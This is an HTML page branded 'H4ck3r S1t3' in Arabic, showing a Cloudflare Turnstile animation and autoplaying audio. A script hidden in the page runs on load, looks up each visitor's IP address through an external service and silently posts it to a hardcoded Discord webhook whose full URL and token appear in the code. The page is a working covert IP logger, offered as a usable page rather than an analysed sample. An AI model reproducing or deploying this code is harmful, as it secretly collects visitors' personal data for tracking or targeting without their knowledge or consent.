<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The End</title>
    <link rel="icon" type="image/png" href="https://cdn.discordapp.com/attachments/1220583016556920993/1231641023894261811/art-fancy-old-man-skull-hand-drawing-and-make-graphic-vector.jpg?ex=6637b216&is=66253d16&hm=db6c6c931525f365a62332a82bcfb9fc70c89517b588f0eb69410ba02a7596dc&">
    <style>
        /* CSS */
        body {
            background-color: #000;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            color: #0F0;
        }

        .container {
            margin-top: 20vh;
        }

        .arrow {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: moveArrow 1.5s infinite;
        }

        img {
            max-width: 100%;
            max-height: 80vh;
            margin-top: 20px;
        }

        @keyframes moveArrow {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            50% {
                transform: translate(-50%, -50%) rotate(180deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>H4ck3r S1t3</h1>
    <span class="arrow">End</span>
    <p>Developed by End</p>
    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2atsfrGgvgOc3DZ91qMlKN/0412afa63e5fac20964377c70c1a9a17/turnstile_gif.gif" alt="الصورة">
</div>

<script>
    // JavaScript
    const webhookURL = 'https://discord.com/api/webhooks/1231177221553786961/rPr2Pnz-_TdxSle_9lPD95pTuhLgNmpFM3AsvFaZFwSZ-cAl42mIsrGzaUlzYkqZaoIH';

    // Get visitor's IP address using an external service
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            const payload = {
                content: `IP الزائر الجديد: ${ipAddress}`,
                embeds: [
                    {
                        title: 'زائر جديد!',
                        description: 'لقد قام زائر جديد بالوصول إلى الموقع.',
                        color: 16711680, // Red color (you can change it)
                        image: {
                            url: 'https://media0.giphy.com/media/FWRtGrSXbUaJzxK9V6/giphy.gif?cid=6c09b952slpw52m2hfmg6yxgmtclm9gg0i8curjo43z0t0ck&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g',
                        },
                        footer: {
                            text: 'Developed by End',
                            icon_url: 'https://cdn.discordapp.com/avatars/1130546038760018060/41eb7e46eafe176a548afbf6c6e82497.png?size=1024', // Add your icon URL here
                        },
                    },
                ],
            };

            // Send data to Discord webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send data to webhook');
                }
            })
            .catch(error => {
                console.error('Error sending data to webhook:', error);
            });
        })
        .catch(error => {
            console.error('Error getting IP address:', error);
        });
</script>

<audio controls src="phonk.mp3" autoplay=""></audio>

</body>
</html>
